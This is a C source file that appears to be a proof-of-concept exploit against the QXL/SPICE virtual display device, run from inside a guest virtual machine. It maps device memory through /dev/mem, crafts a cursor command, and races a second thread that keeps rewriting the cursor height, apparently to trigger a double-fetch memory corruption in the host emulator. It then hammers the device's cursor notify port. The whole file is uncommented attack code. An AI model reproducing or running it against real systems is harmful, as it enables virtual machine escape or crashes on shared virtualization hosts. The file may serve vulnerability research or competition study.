#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include "qxl_dev.h"
#include <sys/io.h>
#include <pthread.h>
#include <string.h>

int set_cpu_affinity(int cpu)
{
	int s;
	cpu_set_t cpuset;
	pthread_t thread;

	thread = pthread_self();
	CPU_ZERO(&cpuset);
	CPU_SET(cpu, &cpuset);

	s = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
	return s;
}

void* job(void *x){
	set_cpu_affinity(1);
	volatile uint16_t *p = x;
	while(1){
		*p = 0x10;
		*p = 0x200;
	}
}


int main(int argc,char** argv){
	pthread_t tid;
	set_cpu_affinity(0);
	iopl(3);
	int fd = open("/dev/mem",2);

	struct qxl_ram_header *ram = (struct qxl_ram_header*) mmap(0,0x8000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0xf4000000+0x3ffe000);
	struct qxl_cursor_cmd *cmd = (struct qxl_cursor_cmd*) mmap(0,0x8000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0xf4000000+0x3ff1000);
	struct qxl_cursor *cursor = (struct qxl_cursor*) mmap(0,0x8000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0xf4000000+0x3ff2000);
	
	cmd->type = QXL_CURSOR_SET;
	cmd->u.set.shape = ( 1ULL<<(64-8) ) + 0x3ff2000;
	cursor->header.width = 0x1;
	cursor->header.height = 0x10;
	cursor->header.type = SPICE_CURSOR_TYPE_ALPHA;
	cursor->chunk.data_size = 0x1000;
	cursor->chunk.prev_chunk = 0;
	cursor->chunk.next_chunk = 0;
	memset(cursor->chunk.data,'a',0x1000);	
	pthread_create(&tid,0,job,&cursor->header.height);
	while(1){
		int idx = ram->cursor_ring_hdr.prod;
		ram->cursor_ring[idx&0x1f].data = ( 1UL<<(64-8) ) + 0x3ff1000;
		ram->cursor_ring[idx&0x1f].type = 0;
		ram->cursor_ring_hdr.prod++;
		outb(0,0xc040+QXL_IO_NOTIFY_CURSOR);	
		sleep(1);
		puts("Done");
	}

	
}
